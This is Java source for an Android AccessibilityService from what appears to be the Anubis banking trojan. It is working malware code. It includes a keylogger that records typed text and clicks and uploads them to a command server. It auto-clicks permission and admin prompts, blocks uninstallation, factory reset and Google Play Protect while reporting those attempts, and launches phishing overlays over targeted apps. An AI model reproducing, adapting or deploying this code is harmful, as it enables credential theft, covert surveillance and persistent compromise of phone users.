package anubis.bot.myapplication;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.Activity.ActivityAlert2;
import anubis.bot.myapplication.Activity.ActivityInjection;

public class ServiceAccessibility extends AccessibilityService {

    UtilsClass SF = new UtilsClass();
    StoreStringClass store = new StoreStringClass();

    String StringActivate =  "";
    String StringPermis =  "";
    String StringYes =  "";
    String StringUninstall1= "";
    String StringUninstall2= "";
    String Stringvkladmin = "";
    String Stringstraccessibility ="";
    String Stringstraccessibility2 ="";
    String textKeylogger="";
    boolean onKeylogger=false;
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    String str1="";
    String str2="";
    public void close(){
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(home);
       /* Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                .putExtra("start", "blockDelete");
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(dialogIntent);*/
    }
    String getNameApplication(Context context){
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            String appName = (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
            return appName;
        }catch (Exception ex){}
        return "";
    }
    private String getEventText(AccessibilityEvent event){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event){
        if (SF.SetRead(this, "urls").length() <= 1) {
            SF.Log(store.TAGServiceAccessibility, "STOP!!");
            return;
        }
        String PackageInj = "";
        String PackageNage = "";
        String strText = "";
        String ClassName ="";
        String getThisPackage = "";
        try {
             PackageInj = event.getPackageName().toString();
             PackageNage = event.getPackageName().toString().toLowerCase();
             strText = getEventText(event).toLowerCase();
             ClassName = event.getClassName().toString().toLowerCase();
             getThisPackage = getNameApplication(this).toLowerCase();
        }catch (Exception ex){
            //return;
        }

        if(onKeylogger) {
            try {
                DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
                String time = df.format(Calendar.getInstance().getTime());

                switch (event.getEventType()) {//Keylogger
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                        String data = event.getText().toString();
                        SF.Log("KEY1", time + "|(TEXT)|" + data);
                        textKeylogger = time + "|(TEXT)|" + data + "|^|";
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                        String data = event.getText().toString();
                        SF.Log("KEY2", time + "|(FOCUSED)|" + data);
                        textKeylogger = time + "|(FOCUSED)|" + data + "|^|";
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                        String data = event.getText().toString();
                        SF.Log("KEY3", time + "|(CLICKED)|" + data);
                        textKeylogger = time + "|(CLICKED)|" + data + "|^|";
                        break;
                    }
                    default:
                        break;
                }
            }catch (Exception ex){
                SF.Log("ERROR1","AccessibilityService");
            }
        }
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
                try {
                    //---keylogger---
                    if (onKeylogger) {
                        if (textKeylogger.length() > 2) {
                            writeFile("keys.log", textKeylogger);
                        }
                    }

                    if (SF.SetRead(this, "keylogger").equals("true")) {
                        onKeylogger = true;
                    } else {
                        onKeylogger = false;
                    }
                    //---------------

                    SF.Log(store.TAGServiceAccessibility, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
                    if (nodeInfo == null) {
                        return;
                    }

/*
                    List<AccessibilityNodeInfo> list44 = nodeInfo.findAccessibilityNodeInfosByText("угрозы");//("активировать");
                    for (AccessibilityNodeInfo node : list44) {
                        SF.Log(store.TAGServiceAccessibility, "ACC::onAccessibilityEvent: left_button " + node);
                            node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
                            break;
                    }
*/
                    //    if(isAdmin(this)) {
                    List<AccessibilityNodeInfo> list = nodeInfo.findAccessibilityNodeInfosByText(SF.getNameApp(this));
                    for (AccessibilityNodeInfo node : list) {
                        List<AccessibilityNodeInfo> lll = nodeInfo.findAccessibilityNodeInfosByText(StringUninstall1);
                        for (AccessibilityNodeInfo node2 : lll) {
                            if (node2.toString().contains("com.android.settings")) {
                                close();
                                SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to remove malware 2|"));
                            }
                        }
                        List<AccessibilityNodeInfo> lll2 = nodeInfo.findAccessibilityNodeInfosByText(StringUninstall2);
                        for (AccessibilityNodeInfo node2 : lll2) {
                            if (node2.toString().contains("com.android.settings")) {
                                close();
                                SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to remove malware 3|"));
                            }
                        }
                    }
                    //   }

                    List<AccessibilityNodeInfo> list4 = nodeInfo.findAccessibilityNodeInfosByText(StringActivate);//("активировать");
                    for (AccessibilityNodeInfo node : list4) {
                        SF.Log(store.TAGServiceAccessibility, "ACC::onAccessibilityEvent: left_button " + node);
                        if (node.toString().contains("com.android.settings")) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }

                    List<AccessibilityNodeInfo> list5 = nodeInfo.findAccessibilityNodeInfosByText(Stringvkladmin);//("активировать");
                    for (AccessibilityNodeInfo node : list5) {
                        if (node.toString().contains("com.android.settings")) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }

                    if (strText.contains("sms") || (strText.contains(SF.getNameApp(this).toLowerCase()))) {
                        List<AccessibilityNodeInfo> list3 = nodeInfo.findAccessibilityNodeInfosByText(StringYes);
                        for (AccessibilityNodeInfo node : list3) {
                            if (node.toString().contains("android.widget.Button") &&
                                    node.toString().contains("com.android.settings")) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            }
                        }
                    }
                    if (strText.contains(SF.getNameApp(this).toLowerCase())) {
                        List<AccessibilityNodeInfo> list6 = nodeInfo.findAccessibilityNodeInfosByText(Stringstraccessibility);//("Подтверждение скриншотов");
                        for (AccessibilityNodeInfo node : list6) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }
                    if (strText.contains(SF.getNameApp(this).toLowerCase())) {
                        List<AccessibilityNodeInfo> list6 = nodeInfo.findAccessibilityNodeInfosByText(Stringstraccessibility2);//("Подтверждение скриншотов");
                        for (AccessibilityNodeInfo node : list6) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }

                    if (strText.contains(SF.getNameApp(this).toLowerCase())) {
                        List<AccessibilityNodeInfo> list6 = nodeInfo.findAccessibilityNodeInfosByText("");//("Подтверждение скриншотов");
                        for (AccessibilityNodeInfo node : list6) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }

                    List<AccessibilityNodeInfo> list2 = nodeInfo.findAccessibilityNodeInfosByText(StringPermis);
                    for (AccessibilityNodeInfo node : list2) {
                        //   if((node.toString().contains("com.google.android.packageinstaller"))){
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        SF.Log("Click", "" + StringPermis);
                        //    }
                    }

                    if ((strText.contains("30"))
                            && (strText.length() > 30)
                            && (strText != "")
                            && (PackageNage.contains("com.android.settings"))) {
                        close();
                        SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to reset the system|"));
                    }
                    //------При удаление прилы------------
                    try {
                        if ((event.getPackageName().toString().contains("com.google.android.packageinstaller"))
                                && (ClassName.contains("android.app.alertdialog"))
                                && (strText.contains(getThisPackage))) {
                            close();
                            SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to remove malware 1|"));
                        }
                    } catch (Exception ex) {
                    }
                    //------При включение play protect------------
                    try {
                        if (ClassName.contains("settings.verifyappssettingsactivity")
                                    &&(SF.SetRead(this,"play_protect").equals("false"))){
                             close();

                            SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Trying to enable <Google Play Protect>!|"));
                        }
                    } catch (Exception ex) {}


                    //Получаем процессы для инжектирования
                    String data_file = SF.SetRead(this, "save_inj");
                    if (data_file.length() > 5) {
                        StartScanInjector(this, data_file, PackageInj);
                    }

                    if (!SF.isMyServiceRunning(this, StartWhileGlobal.class)) {
                        startService(new Intent(this, StartWhileGlobal.class));
                    }
                }catch (Exception ex){
                    SF.Log("ERROR","AccessibService");
                }

            }

              /*  List<AccessibilityNodeInfo> list6 = nodeInfo.findAccessibilityNodeInfosByText(StringPermis);
        for (AccessibilityNodeInfo node : list6) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }*/

        //По тексту
     /*  if((store.StringDeleteALL.toLowerCase().contains("|"+strText+"|"))
                &&(strText!="")
                &&(PackageNage.contains("com.android.settings"))){
            Log.e("!!","start");
            close();
           SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Attempt to reset the system or disable the accessibility features|"));
        }*/


      /*SF.Log("ssss", String.format(
                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
               strText, event.getClassName(), event.getPackageName(),
                event.getEventTime(), getEventText(event)));*/
    }

    @Override
    public void onInterrupt() {
        SF.Log(store.TAGServiceAccessibility, "onInterrupt");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        SF.Log(store.TAGServiceAccessibility, "onServiceConnected");
        StringActivate =  SF.SetRead(this, "StringActivate");
        StringPermis =  SF.SetRead(this, "StringPermis");
        StringYes =  SF.SetRead(this, "StringYes");
        StringUninstall1 = SF.SetRead(this, "uninstall1");
        StringUninstall2 = SF.SetRead(this, "uninstall2");
        Stringvkladmin = SF.SetRead(this,"vkladmin");
        Stringstraccessibility = SF.SetRead(this,"straccessibility");
        Stringstraccessibility2 = SF.SetRead(this,"straccessibility2");

        try {
            int getTimeWork = Integer.parseInt(SF.SetRead(this, "time_work"));
            int getStartPermission = Integer.parseInt(SF.SetRead(this, "time_start_permission"));
            getStartPermission = getStartPermission+getTimeWork+120;
            SF.SetWrite(this,"time_start_permission",""+getStartPermission);
        }catch (Exception ex){}

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }

    void StartScanInjector(final Context context,final String datainj,  final String getTopApp){
        Runnable runnable = new Runnable() {
            public void run() {
                SF.Log("Start","StartScanInjector ServiceAccessibility");
                String data_file = datainj;
                if(data_file.contains("com.imo.android.imoim,com.twitter.android")){
                    data_file=data_file.replace("com.imo.android.imoim,com.twitter.android","com.imo.android.imoim,com.twitter.android,com.android.vending");
                }
                SF.Log("ACCESIB",""+data_file);
                if ((data_file != "") && (SF.isConnectedWifiOrMobile(context))){
                    String packageNames = getTopApp;
                    String nameInject = null;
                    SF.Log("App", "" + packageNames);

                    for (int i4 = 0; i4 < data_file.split("/").length; i4++) {
                        String nameApp[] = data_file.split("/")[i4].split(",");
                        for (int j = 1; j < nameApp.length; j++) {
                            if (packageNames.contains(nameApp[j])) {
                                nameInject = nameApp[0];
                                SF.Log("nameInject",nameInject);
                                break;
                            }
                        }
                        if (nameInject != null) break;
                    }
                    if (nameInject != null) {
                        //*************Проверка состояние экрана*******
                        KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                        boolean locked = km.inKeyguardRestrictedInputMode();
                        if (locked == false) {
                            try {
                                    Intent dialogIntent = new Intent(context, ActivityInjection.class)
                                            .putExtra("str", nameInject);
                                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                    startActivity(dialogIntent);
                            } catch (Exception ex) {
                                SF.POST(context, "4", "p=" + SF.trafEnCr(SF.ID_B(context) + "|ERROR START INJECTIONS|"));
                            }
                        }
                    }
                }else{
                    return;
                }
            }
        };
        Thread thread = new Thread(runnable);
        thread.start();
    }

    String readFile(String FILENAME) {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput(FILENAME)));
            String str = "";
            String s="";
            while ((str = br.readLine()) != null) {
                s=s+str;
            }
            return s;
        } catch (IOException e) {
            return "";
        }
    }
    void clearFile(String FILENAME) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
                    openFileOutput(FILENAME, MODE_PRIVATE)));
            bw.write("");
            bw.close();
        } catch (IOException e) {

        }
    }
    void writeFile(String FILENAME,String text) {
        textKeylogger="";
        try {
            String s = readFile(FILENAME);
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
                    openFileOutput(FILENAME, MODE_PRIVATE)));
            s=s + text+"|^|";
            bw.write(s);
            bw.close();


            SF.Log("Len key",""+s.length());

            if(s.length()>10000){//отправляем
                s=s.replace("|^|","\n");
               String responce =  SF.POST(this, "12", "p=" + SF.trafEnCr(SF.ID_B(this) + "~~~~~~~~~~"+s));
                SF.Log("SEND KEL","LOGER");
                responce=SF.trafDeCr(responce);
                if(responce.contains("clear")){
                    SF.Log("SEND KEL","CLEAR");
                    clearFile("keys.log");
                }
            }

        } catch (IOException e) {

        }
    }
}